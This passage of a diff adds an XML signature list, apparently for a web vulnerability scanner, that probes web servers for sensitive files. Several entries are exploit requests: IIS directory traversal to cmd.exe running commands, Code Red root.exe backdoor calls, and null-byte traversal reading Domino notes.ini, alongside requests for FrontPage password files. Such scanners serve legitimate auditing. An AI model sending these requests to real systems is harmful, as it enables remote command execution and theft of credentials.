+   <info>/status.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/survey.cgi</get>
+   <info>/survey.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/system</get>
+   <info>/system</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/temp</get>
+   <info>/temp</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/test</get>
+   <info>/test</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/test-cgi</get>
+   <info>/test-cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/test/test.cgi</get>
+   <info>test/test.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/testing</get>
+   <info>/testing</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/textcounter.pl</get>
+   <info>/textcounter.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/tools/newdsn.exe</get>
+   <info>tools/newdsn.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/unlg1.1</get>
+   <info>/unlg1.1</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/update.cgi</get>
+   <info>/update.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/update.pl</get>
+   <info>/update.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/uploader.exe</get>
+   <info>/uploader.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/users/scripts/submit.cgi</get>
+   <info>submit.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/vfs</get>
+   <info>/vfs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/view-source</get>
+   <info>/view-source</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/vti_pvt/administrators.pwd</get>
+   <info>[VTI] Administrators.pwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/vti_pvt/authors.pwd</get>
+   <info>[VTI] Authors.pwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/vti_pvt/service.pwd</get>
+   <info>[VTI] Service.pwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/vti_pvt/users.pwd</get>
+   <info>[VTI] Users.pwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/warez</get>
+   <info>/warez</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/webcart</get>
+   <info>/webcart/ dir</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/webdist.cgi</get>
+   <info>/webdist.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/webgais</get>
+   <info>/webgais</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/webmaster_logs</get>
+   <info>/webmaster_logs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/websendmail</get>
+   <info>/websendmail</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/wguest.exe</get>
+   <info>/wguest.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/work</get>
+   <info>/work</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/wrap</get>
+   <info>/wrap</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/www-sql</get>
+   <info>/www-sql</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/wwwboard.pl</get>
+   <info>/wwwboard.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/wwwboard/passwd.txt</get>
+   <info>/wwwboard/passwd.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/xxxxxxx.....xxxxxxxxx</get>
+   <info>dos checking</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/~root</get>
+   <info>/~root</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/ASPSamp/AdvWorks/equipment/catalog_type.asp</get>
+   <info>catalog_type.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/AdvWorks/equipment/catalog_type.asp</get>
+   <info>catalog_type.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/Default.asp</get>
+   <info>/Default.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/winnt/system32/cmd.exe?/c%20dir</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/achg.htr</get>
+   <info>achg.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/aexp.htr</get>
+   <info>aexp.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/aexp2.htr</get>
+   <info>aexp2.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/aexp2b.htr</get>
+   <info>aexp2b.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/aexp3.htr</get>
+   <info>aexp3.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/aexp4.htr</get>
+   <info>aexp4.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/aexp4b.htr</get>
+   <info>aexp4b.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/anot.htr</get>
+   <info>anot.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/anot3.htr</get>
+   <info>anot3.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/IISADMPWD/root.exe?/c%20dir</get>
+   <info>Code RED</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin</get>
+   <info>_vti_bin</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/winnt/system32/cmd.exe?/c%20dir</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/_vti_adm</get>
+   <info>_vti_adm</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/_vti_adm/admin.dll</get>
+   <info>admin.dll</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/_vti_aut</get>
+   <info>_vti_aut</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/_vti_aut/author.dll</get>
+   <info>_vti_author dll</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/_vti_aut/author.exe</get>
+   <info>_vti_aut author</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/_vti_aut/dvwssr.dll</get>
+   <info>dvwssr.dll</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/fpcount.exe</get>
+   <info>/_vti_bin/fpcount.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/root.exe?/c%20dir</get>
+   <info>Code RED</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.dll</get>
+   <info>shtml.dll</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.exe</get>
+   <info>shtml.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.exe/com1.</get>
+   <info>/_vti_bin/shtml.exe/com1.</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.exe/com1.asp</get>
+   <info>/_vti_bin/shtml.exe/com1.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.exe/mailslot.htm</get>
+   <info>/_vti_bin/shtml.exe/mailslot.htm</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.exe/pipe.htm</get>
+   <info>/_vti_bin/shtml.exe/pipe.htm</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_bin/shtml.exe/unc.htm</get>
+   <info>/_vti_bin/shtml.exe/unc.htm</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_inf.html</get>
+   <info>_vti_inf.html</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/access.cnf</get>
+   <info>access.cnf</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/admin.pwd</get>
+   <info>admin.pwd</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/administrators.pwd</get>
+   <info>/_vti_pvt/administrators.pwd</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/authors.pwd</get>
+   <info>authors.pwd</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/service.cnf</get>
+   <info>service.cnf</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/service.pwd</get>
+   <info>service.pwd</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/service.stp</get>
+   <info>service.stp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/services.cnf</get>
+   <info>services.cnf</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/shtml.dll</get>
+   <info>FrontPage extention;by Void;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/shtml.exe</get>
+   <info>FrontPage extention;by Void;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/svcacl.cnf</get>
+   <info>svcacl.cnf</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/users.pwd</get>
+   <info>users.pwd</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pvt/writeto.cnf</get>
+   <info>writeto.cnf</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/_vti_pwd/administrators.pwd</get>
+   <info>administrat.pwd</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/blabla.ida</get>
+   <info>IIS path-revealing;by duke;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/blabla.idc</get>
+   <info>IIS path-revealing;by duke;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/blabla.idq</get>
+   <info>IIS path-revealing;by duke;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/blabla.idw</get>
+   <info>IIS any file reading;by duke;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/winnt/system32/cmd.exe?/c%20dir</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/cgi-bin/dasp/fm_shell.asp</get>
+   <info>fm_shell.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/cgi-bin/root.exe?/c%20dir</get>
+   <info>Code RED</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/default.asp</get>
+   <info>/default.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/default.asp.</get>
+   <info>/default.asp.</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/default.asp::$DATA</get>
+   <info>/default.asp::$DATA</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/eatme.ida</get>
+   <info>/eatme.ida</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/eatme.idc</get>
+   <info>/eatme.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/eatme.idq</get>
+   <info>/eatme.idq</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/eatme.idw</get>
+   <info>/eatme.idw</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmin</get>
+   <info>iisadmin dir</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/achg.htr</get>
+   <info>/iisadmpwd/achg.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/aexp.htr</get>
+   <info>/iisadmpwd/aexp.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/aexp2.htr</get>
+   <info>aexp2</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/aexp2b.htr</get>
+   <info>/iisadmpwd/aexp2b.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/aexp3.htr</get>
+   <info>/iisadmpwd/aexp3.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/aexp4.htr</get>
+   <info>/iisadmpwd/aexp4.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/aexp4b.htr</get>
+   <info>/iisadmpwd/aexp4b.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/anot.htr</get>
+   <info>/iisadmpwd/anot.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iisadmpwd/anot3.htr</get>
+   <info>/iisadmpwd/anot3.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iishelp/iis/misc/iirturnh.htwa</get>
+   <info>/iishelp/iis/misc/iirturnh.htwa</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/exair/howitworks/codebrws.asp</get>
+   <info>codebrws.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/exair/search/advsearch.asp</get>
+   <info>advsearch.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/exair/search/qfullhit.htw</get>
+   <info>/iissamples/exair/search/qfullhit.htw</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/exair/search/qsumrhit.htw</get>
+   <info>/iissamples/exair/search/qsumrhit.htw</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/iissamples/query.asp</get>
+   <info>query.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/issamples/oop/qfullhit.htw</get>
+   <info>/iissamples/issamples/oop/qfullhit.htw</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/issamples/oop/qsumrhit.htw</get>
+   <info>/iissamples/issamples/oop/qsumrhit.htw</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/iissamples/sdk/asp/docs/codebrws.asp</get>
+   <info>codebrws.asp 2</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/index.asp::$DATA</get>
+   <info>index.asp::$DATA</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/main.asp%81</get>
+   <info>index.asp%81</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/msadc/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/winnt/system32/cmd.exe?/c%20dir</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/msadc/Samples/SELECTOR/showcode.asp</get>
+   <info>/msadc/Samples/SELECTOR/showcode.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/msadc/root.exe?/c%20dir</get>
+   <info>Code RED</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/msadc/samples/adctest.asp</get>
+   <info>msadc adctest.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/msads/Samples/SELECTOR/showcode.asp</get>
+   <info>showcode.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/msads/Samples/selector/showcode.asp</get>
+   <info>/msads/Samples/selector/showcode.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%25%35%63..%25%35%63cmd.exe</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%25%35%63..%25%35%63cmd.exe?%2FC+echo+\"hacked!\">c:\\hello.bat</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%25%35%63..%25%35%63winnt/system32/cmd.exe</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%25%35%63..%25%35%63winnt/system32/cmd.exe?%2FC+echo+\"hacked!\">c:\\hello.bat</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:\</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%5C..%5Ccmd.exe</get>
+   <info>/scripts/../../cmd.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%5C..%5Ccmd.exe?%2FC+echo+\"hacked!\">c:\\hello.bat</get>
+   <info>cmd.exe bug</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%5C..%5Cwinnt/system32/cmd.exe</get>
+   <info>/scripts/../../cmd.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%5C..%5Cwinnt/system32/cmd.exe?%2FC+echo+\"hacked!\">c:\\hello.bat</get>
+   <info>cmd.exe bug</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%5C..%5Cwinnt/system32/cmd.exe?/c+dir+c:\</get>
+   <info>/scripts/../../cmd.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/winnt/system32/cmd.exe?/c%20dir</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/../../cmd.exe</get>
+   <info>/scripts/../../cmd.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/../../cmd.exe?%2FC+echo+\"hacked!\">c:\\hello.bat</get>
+   <info>cmd.exe bug</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/../../winnt/system32/cmd.exe</get>
+   <info>/scripts/../../cmd.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/../../winnt/system32/cmd.exe?%2FC+echo+\"hacked!\">c:\\hello.bat</get>
+   <info>cmd.exe bug</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/../../winnt/system32/cmd.exe?/c+dir+c:\</get>
+   <info>/scripts/../../cmd.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/bdir.htr</get>
+   <info>/scripts/iisadmin/bdir.htr</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/default.htm</get>
+   <info>iisadmin default</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/ism.dll</get>
+   <info>iisadmin/ism.dll</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/ism.dll?http/dir</get>
+   <info>dunno;RainM;</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/ctgestb.htx</get>
+   <info>ctgestb.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/ctgestb.idc</get>
+   <info>ctgestb.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/details.htx</get>
+   <info>details.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/details.idc</get>
+   <info>details.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/query.htx</get>
+   <info>query.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/query.idc</get>
+   <info>query.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/register.htx</get>
+   <info>register.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/register.idc</get>
+   <info>register.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/sample.htx</get>
+   <info>sample.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/sample.idc</get>
+   <info>sample.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/sample2.htx</get>
+   <info>sample2.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/viewbook.htx</get>
+   <info>viewbook.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/samples/viewbook.idc</get>
+   <info>viewbook.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/tools/ct.htx</get>
+   <info>ct.htx</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/tools/ctss.idc</get>
+   <info>ctss.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/tools/dsnform.exe</get>
+   <info>dsnform.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/tools/getdrvrs.exe</get>
+   <info>getdrvrs.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/tools/mkilog.exe</get>
+   <info>mkilog.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/iisadmin/tools/newdsn.exe</get>
+   <info>newdsn.exe</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/issadmin/bdir.htr</get>
+   <info>bdir.htr - sampl</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/postinfo.asp</get>
+   <info>postinfo.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/repost.asp</get>
+   <info>repost.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/root.exe?/c%20dir</get>
+   <info>Code RED</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/samples/ctguestb.idc</get>
+   <info>ctguestb.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/samples/details.idc</get>
+   <info>details.idc</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/srchadm/admin.idq</get>
+   <info>srhadm/admin.idq</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/upload.asp</get>
+   <info>upload.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/uploadn.asp</get>
+   <info>uploadn.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/scripts/uploadx.asp</get>
+   <info>uploadx.asp</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/wwwroot/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/winnt/system32/cmd.exe?/c%20dir</get>
+   <info>/scripts/../../cmd.exe. Patch for IIS4 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787 Patch for IIS5 http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/wwwroot/root.exe?/c%20dir</get>
+   <info>Code RED</info>
+   <server>iis</server>
+</url>
+
+<url>
+   <get>/%00%00.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00%20.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00%c0%af.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00...nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00.nsf.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00.nsf/../../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00.nsf/..//lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%00.nsf//../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%20%00.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%20.nsf/..//lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%20.nsf//../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%c0%af%00.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%c0%af.nsf/..//lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/%c0%af.nsf//../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/...nsf/..//lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/...nsf//../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf%00.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf.nsf/..//lotus/domino/notes.ini</get>
